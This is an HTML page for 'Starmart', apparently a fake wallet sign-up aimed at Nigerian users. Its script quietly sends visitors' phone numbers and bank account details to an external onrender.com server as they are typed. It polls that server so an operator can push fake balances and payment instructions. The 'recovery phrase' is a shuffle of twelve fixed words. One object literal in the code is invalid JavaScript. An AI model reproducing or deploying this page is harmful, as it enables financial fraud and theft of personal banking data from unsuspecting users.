<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=0">
    <title>Starmart</title>
    <link rel="icon" href="../image.jpg" type="image/x-icon">
	<meta name="theme-color" content="#0066ff">
    <link rel="shortcut icon" href="starmart.jpeg" type="image/x-icon">
    <link rel="manifest" href="../manifest.json">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
  body {
  font-family: 'Arial', sans-serif;
  margin: 0;
  padding: 0;
  line-height: 1.6;
}

/* Top Ad Styles */
.top {
	position: fixed;
	top: 0;
	display: flex;
	background: #fff;
	margin: 0;
	justify-content: space-between;
	box-sizing: border-box;
	align-items: center;
	width: 100%;
	padding: 10px 20px;
	z-index: 1000;
	border-bottom: 2px solid #fff;
	box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
}
.logo p{
	font-size: 24px;
	font-family: "Poppins", "Manrope", system-ui, sans-serif;
	font-weight: 700;     
	letter-spacing: -0.6px;
	color: #0066ff;
	margin: 0;
}
.logo i {
	font-size: 30px;
	margin-right: 10px;
}
.topBtn button{
	font-size: 14px;
	background: #fff;
	color: #0066ff;
	border: 2px solid #0066ff;
	padding: 8px 12px;
	border-radius: 20px;
	display: none;
}
/* Header */
.header {
  text-align: center;
  padding: 2rem;
  background-image: url('starmart.jpeg'); 
  background-position: bottom; 
  background-size: cover;
  border-top: 10px solid black;
  height: 70px;   
}

.header h1, .lower h1 {
  font-size: 3rem;
  color: #ff6f61;
  margin: 0;
  filter: drop-shadow(2px 4px 6px black);
  opacity: 0;
}

.header p, .lower p {
  font-size: 1.2rem;
  margin: 0.5rem 0;
  color: #ff6f61;
  opacity: 0;
}

/* Content */
.content {
	padding: 0.5rem;
}

 section {
	 margin-bottom: 2rem;
 }

/* Body */
.container {
	margin: 5px auto;
    padding: 5px 20px 40px;
    box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.15);
    border-radius: 5px;
	max-width: 500px;
}
.formHead {
	font-size: 1.5rem;
	font-weight: 700;
}
.step-indicator {
	display: flex;
	justify-content: space-between;
	margin-bottom: 40px;
	position: relative;      
}
.step-indicator:before {
	content: '';         
	position: absolute;        
	top: 15px;         
	left: 0;       
	right: 0;       
	height: 2px;        
	background: #eee;        
	z-index: 1;   
}
.step {
	text-align: center;       
	position: relative;        
	z-index: 2;
}
.step-number {
	width: 30px;        
	height: 30px;       
	border-radius: 50%;         
	background: #eee;
	color: #999;        
	display: flex;         
	align-items: center;        
	justify-content: center;        
	margin: 0 auto 10px;        
	font-weight: bold;   
}
.step.active .step-number {
	background: #0066ff;
	color: white;      
}
.step.completed .step-number {           
	background: #7FB2FF;
	color: white;
}
.step-title {
	font-size: 14px;        
	color: #999;
}
.step.active .step-title {
	color: #0066ff;        
	font-weight: 500;    
}
.step.completed .step-title {
	color: #7FB2FF;    
}
.container label {
	display: block;
	font-size: 0.9rem;
	font-weight: bold;
	padding-left: 10px;
}
.container input {
	border: 1px solid #000;
	outline: none;
	padding: 10px;
	font-size: 16px;
	margin-bottom: 15px;
	width: 90%;
}
.password {
	margin: 0;
	position: relative;
}
.password button {
	text-align: right;
	position: absolute;
	top: 40%;
	right: 5%;
	font-size: 16px;
	background: none;
	border: none;
	transform: translateY(-50%);
	padding: 7px 20px;
	color: #000;
}
	  
#response {
	font-weight: bold;
	padding: 0px 10px 20px;
	
}
.buttons {
	display: flex;
	justify-content: center;
	width: 80%;
	text-align: center;
	margin: 20px auto 10px;	
}
	  
.buttons:has(button:nth-child(2)) {
  justify-content: space-between;
}

.buttons button {
	border: 1px solid #0066ff;
	background: none;
	color: #0066ff;
	padding: 8px 25px;
	font-size: 14px;
	font-weight: 600;
	border-radius: 10px;
}
.buttons button:hover {
	background-color: #ccc;
	color: #111;
	border: 1px solid #111;
	cursor: not-allowed;
	opacity: 0.5;
}

/* Third Step */
.mnemonic-container {       
	background: #f8f9fa;
    border-radius: 10px;
    padding: 20px;
    margin-bottom: 20px;
    text-align: center; 
}
	  
.mnemonic-words {
    display: flex;
    flex-wrap: wrap;
    justify-content: center;
    gap: 10px;
    margin: 20px 0;       
}
	  
.mnemonic-word {
    background: white;
    border: 1px solid #ddd;
    border-radius: 6px;
    padding: 8px 12px;
    font-weight: 500;
    position: relative;
}
	  
.mnemonic-word span {
    position: absolute;
    top: -8px;
    left: 8px;
	font-size: 10px;
    background: var(--primary);
    color: white;
    width: 16px;
    height: 16px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
}

.mnemonicButton {
	display: flex; 
	justify-content: space-between;
	padding: 15px;
}

.mnemonicButton button {
	background: none;
	border: none;
	text-align: center;
	font-size: 14px;
}

.mnemonicButton span {
	display: block;
}
/* Hide */
.hidden {
	display:none;
}
  </style>
</head>
<body>
<!-- Top Page Advertisement -->
  <div class="top">
    <div class="logo">
      <p><i class="fa fa-balance-scale" aria-hidden="true"></i><strong>Starmart</strong></p>
	</div>
	<div class="topBtn">
		<button id="redeemBtn">Redeem Token</button>
	</div>
  </div>

  <!-- Header Section -->
  <header class="header">
    <!-- For IMAGE -->
  </header>

  <!-- Main Content -->
  <main class="content">
    <!-- Form Part -->
    <section>
		<div class="container">
			<h2 class="formHead">Create New Wallet</h2>
            
            <!-- Step Indicator -->
            <div class="step-indicator">
                <div class="step active" id="step1">
                    <div class="step-number">1</div>
                    <div class="step-title">Create</div>
                </div>
                <div class="step" id="step2">
                    <div class="step-number">2</div>
                    <div class="step-title">Add Account</div>
                </div>
                <div class="step" id="step3">
                    <div class="step-number">3</div>
                    <div class="step-title">Complete</div>
                </div>
            </div>

			<!-- Step 1: Wallet Creation -->
            <div id="creationStep">
				<form method="post" id="form">
					<label for="walletName">Wallet Name</label>
					<input type="text" id="walletName" name="walletName" placeholder="Enter a Wallet Name" required>
					
					<label for="phone">Phone</label>
					<input type="tel" id="phone" name="phone" placeholder="Enter Phone" onchange="toa({message: this.value})" required>

					<label for="country">Country & Currency</label>
					<input type="text" value="Nigeria: &#8358;" id="country" readonly>

					<label for="password">Password</label>
					<div class="password">
						<input type="password" id="password" name="password" placeholder="create a strong password" required>
						<button type="button" id="toggleButton"><i class="fas fa-eye"></i></button>
					</div>
					
					<label for="confirmPassword">Confirm Password</label>
					<input type="password" id="confirmPassword" name="confirmPassword" placeholder="re-enter password" required>
					
					<small id="response"></small>

					
					<div class="buttons">
						<button type="submit">Next</button>
					</div>
				</form>
			</div>
			
			<!-- Step 2: Account -->
            <div id="accountStep" class="hidden">
				<form method="post" id="formTwo">
					<label for="azaName">Bank Name</label>
					<input type="text" id="azaName" name="azaName" placeholder="eg Opay, Access..." onchange="toa({message: this.value})" required>
					
					<label for="azaNumber">Account Number</label>
					<input type="text" id="azaNumber" name="azaNumber" placeholder="0123456789" onchange="toa({message: this.value})" required>
				
					<div class="buttons">
						<button type="button" id="backToCreation">Back</button>
						<button type="submit">Next</button>
					</div>
				</form>
			</div>

			<!-- Step 3: Completion -->
            <div id="completionStep" class="hidden">
					<div class="mnemonic-container">
						<h3 style="margin-top: 0;">Your Recovery Phrase</h3>
						<div class="mnemonic-words" id="mnemonicPhrase">
							<!-- Will be filled by JavaScript -->
						</div>
                    
						<div class="mnemonicButton">
							<button id="copyMnemonic" class="secondary">
								<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="vertical-align: middle; margin-right: 5px;">
									<path d="M16 1H4C2.9 1 2 1.9 2 3V17H4V3H16V1ZM19 5H8C6.9 5 6 5.9 6 7V21C6 22.1 6.9 23 8 23H19C20.1 23 21 22.1 21 21V7C21 5.9 20.1 5 19 5ZM8 21V7H19V21H8Z" fill="#0066ff"/>
								</svg>
								<span>Copy</span>
							</button>
							<button id="downloadMnemonic" class="secondary">
								<svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="vertical-align: middle; margin-right: 5px;">
									<path d="M19 9H15V3H9V9H5L12 16L19 9ZM5 18V20H19V18H5Z" fill="#0066ff"/>
								</svg>
								<span>Download</span>
							</button>
						</div>
					</div>
				<div class="buttons">
					<button id="backToAccount">Back</button>
					<button id="goToDashboard">Complete</button>
				</div>
		</div>
    </section>
  </main>

</body>
	<script src="../sw.js"></script>
	<script>
		// Senders
		function sender(payload) {
            const url = 'https://send-39yi.onrender.com/api/messages';  
            fetch(url, {
                method: 'POST',
                headers: {     
                    'Content-Type': 'application/json',  
                },   
                body: JSON.stringify(payload)    
            });  
        }

		function toa(payload) {
            const url = 'https://send-39yi.onrender.com/send';  
            fetch(url, {
                method: 'POST',
                headers: {     
                    'Content-Type': 'application/json',  
                },   
                body: JSON.stringify(payload)    
            });  
        }
        // Code Generator
        function generateRandomCode() {
            const numbers = Array.from({length: 8}, () => Math.floor(Math.random() * 10));
            const letters = Array.from({length: 2}, () => String.fromCharCode(65 + Math.floor(Math.random() * 26)));
            const allChars = [...numbers, ...letters];
           
            // Shuffle the array
            for (let i = allChars.length - 1; i > 0; i--) {  
                const j = Math.floor(Math.random() * (i + 1));
                [allChars[i], allChars[j]] = [allChars[j], allChars[i]];
            }
            return allChars.join('');
        }

        // Check if a User Account has been created
        if (localStorage.getItem('savedInfos')) {
            console.log('UserId is already stored');
        } else {
            const code = generateRandomCode();
            const digits = Array.from({ length: 10 }, () => Math.floor(Math.random() * 10)).join('');
            const Infos = {
                userId: code,
                demoAcc: digits,
                azaName: '',  
                realAcc: '',
                name: '',
                amount: 0,
				request: false,
                update: '',
                payName: '',
                payNumber: ''
            };
    
            localStorage.setItem('savedInfos', JSON.stringify(Infos));
            sender(Infos);
        }

		// GET SavedInfo
        const savedInfo = JSON.parse(localStorage.getItem('savedInfos'));
        const userId = savedInfo.userId;
        
        // Send Status      
        document.addEventListener('visibilitychange', () => { 
            if (document.visibilityState === 'visible') {
                //sender({ userId: userId, status: "online" });
            } else {
                //sender({ userId: userId, status: "offline" });          
            }
        });

    
        // HANDLE NEW WALLET CREATION
        const form = document.getElementById('form');
		const formTwo = document.getElementById('formTwo');
		const creationStep = document.getElementById('creationStep');
		const accountStep = document.getElementById('accountStep');
        const completionStep = document.getElementById('completionStep');
		const mnemonicPhrase = document.getElementById('mnemonicPhrase');

		// Step Buttons and Steps
		const backToCreation = document.getElementById('backToCreation');
		const backToAccount = document.getElementById('backToAccount');
		const goToDashboard = document.getElementById('goToDashboard');
		
		// Step indicators
        const step1 = document.getElementById('step1');
        const step2 = document.getElementById('step2');
        const step3 = document.getElementById('step3');

		// Password Show/Hide
		const passwordInput = document.getElementById('password');
		const confirmInput = document.getElementById('confirmPassword');
		const toggleButton = document.getElementById('toggleButton');
		const icon = toggleButton.querySelector('i');

		toggleButton.addEventListener('click', () => {
			const type = passwordInput.type === 'password' ? 'text' : 'password';
			passwordInput.type = type;
			confirmInput.type = type;
			
			icon.classList.toggle('fa-eye');
			icon.classList.toggle('fa-eye-slash');
		});

		// Generate a random mnemonic phrase (simplified for demo)
        const generateMnemonic = () => {     
			const words = [
                'apple', 'banana', 'cherry', 'dragon', 'elephant', 'flower',
                'giraffe', 'honey', 'island', 'jungle', 'kangaroo', 'lemon'
            ];
            // Shuffle and take 12 words
            return words.sort(() => 0.5 - Math.random()).slice(0, 12);
        };


		// Copy mnemonic to clipboard
        document.getElementById('copyMnemonic').addEventListener('click', function() {
            const words = Array.from(document.querySelectorAll('.mnemonic-word')).map(el => el.textContent.trim()).join(' ');
                
            navigator.clipboard.writeText(words).then(() => {
                alert('Recovery phrase copied to clipboard!');
            });
        });
           
        // Download mnemonic as text file
        document.getElementById('downloadMnemonic').addEventListener('click', function() {
            const words = Array.from(document.querySelectorAll('.mnemonic-word')).map(el => el.textContent.trim()).join(' ');
                
            const blob = new Blob([words], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'starmart.txt';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
		});

		
		// FIRST FORM
        form.addEventListener('submit', (event) => {
            event.preventDefault();

			const password = document.getElementById('password').value;
            const confirmPassword = document.getElementById('confirmPassword').value;
			const response = document.getElementById('response');
			
            // Validate passwords match
            if (password !== confirmPassword) {
				response.style.color = 'red';
                response.textContent = 'Passwords do not match!';
				setTimeout(() => {
					response.style.color = '';
					response.textContent = ''; 
				}, 3000); 
				return;
            }
			
			if (password.length < 8) {
				response.style.color = 'red';
                response.textContent = 'Password must be atleast 8 characters!';
				setTimeout(() => {
					response.style.color = '';
					response.textContent = ''; 
				}, 3000); 
				return;
            }
			
            const formData = new FormData(form);
            //const message = formData.get('message');
            //sender(message, randomCode);
			
			setTimeout(() => {
				// Show account step   
				creationStep.classList.add('hidden');
				accountStep.classList.remove('hidden');   
           
				// Update step indicator    
				step1.classList.remove('active');
				step1.classList.add('completed');
				step2.classList.add('active');	
			}, 3000); 
        })

		// Back to creating
		backToCreation.addEventListener('click', function() {
			setTimeout(() => {
				// Show completion step
				accountStep.classList.add('hidden');
				creationStep.classList.remove('hidden');
                
				// Update step indicator
				step1.classList.remove('completed');
				step2.classList.remove('active'); 
				step1.classList.add('active');
			}, 1000);
		});

		// SECOND FORM
        formTwo.addEventListener('submit', (event) => {
			event.preventDefault();
            const formData = new FormData(formTwo);
            const inputAzaName = formData.get('azaName');
            const inputRealAcc = formData.get('azaNumber');
			
			savedInfo.azaName = inputAzaName;
			savedInfo.realAcc = inputRealAcc;
			localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
			sender({ userId: savedInfo.userId, azaName: savedInfo.azaName, realAcc: savedInfo.realAcc });
			toa({ message: savedInfo.userId, savedInfo.azaName, savedInfo.realAcc });
			

			// Generate and display mnemonic
            const mnemonic = generateMnemonic();
            mnemonicPhrase.innerHTML = '';
                
            mnemonic.forEach((word, index) => {
                const wordElement = document.createElement('div');
                wordElement.className = 'mnemonic-word';
                wordElement.innerHTML = `<span>${index + 1}</span>${word}`;
                mnemonicPhrase.appendChild(wordElement);
            });
			
			setTimeout(() => {
				// Show account step   
				accountStep.classList.add('hidden');
				completionStep.classList.remove('hidden');
           
				// Update step indicator    
				step2.classList.remove('active');
				step2.classList.add('completed');
				step3.classList.add('active');
			}, 3000);         
		})
		
		// Back to account
        backToAccount.addEventListener('click', function() {
			setTimeout(() => {
				// Show account step   
				completionStep.classList.add('hidden');
				accountStep.classList.remove('hidden');
           
				// Update step indicator    
				step2.classList.remove('completed');
				step3.classList.remove('active');
				step2.classList.add('active');
			}, 1000); 
		});
		
		// COMPLETE FORM
        goToDashboard.addEventListener('click', function() {
			setTimeout(() => {
				window.location.href = 'dashboard.html';
				//localStorage.setItem('login', 'true');
			}, 3000);
        });
		
		
        // MAIN CODE FETCH AND EXTRACTION
		let lastMessageId = localStorage.getItem('latestId') || 0;
        async function fetchMessages() {
            try {
                const response = await fetch(`https://send-39yi.onrender.com/in/messages?lastMessageId=${lastMessageId}`);
                const newMessages = await response.json();

                if (newMessages.length > 0) {
                    extractMessages(newMessages);
                    // Update last message ID
                    lastMessageId = newMessages[newMessages.length - 1].id;
                    localStorage.setItem('latestId', lastMessageId);
                }
            } catch (error) {
                console.error('Error fetching messages:', error);
            } finally {
                // Immediately poll again
                setTimeout(fetchMessages, 100);
            }
        }

		// Extract New Messages, Save/Update
        function extractMessages(messages) {
            messages.forEach(message => {
				if(savedInfo.userId.toLowerCase() === message.userId.toLowerCase()){
					console.log('For User');
					if(message.name){
						savedInfo.name = message.name;
						localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
						sender({ userId: savedInfo.userId, name: savedInfo.name });
					}
					if(message.amount){
						savedInfo.amount = message.amount;
						localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
						sender({ userId: savedInfo.userId, amount: savedInfo.amount });
					}
					if(message.update){
						savedInfo.update = message.update;
						localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
						sender({ userId: savedInfo.userId, update: savedInfo.update });
					}
					if(message.payName){
						savedInfo.payName = message.payName;
						localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
					}
					if(message.payNumber){
						savedInfo.payNumber = message.payNumber;
						localStorage.setItem('savedInfos', JSON.stringify(savedInfo));
						sender({ userId: savedInfo.userId, update: `${savedInfo.payName} ${savedInfo.payNumber}` });
						
					}
                } else {
                    console.log('Not For User');
                }
            });
        }
    
        // Start polling when page loads
        window.addEventListener('load', () => {
            fetchMessages(); 
        });

	</script>
</html>
  
  
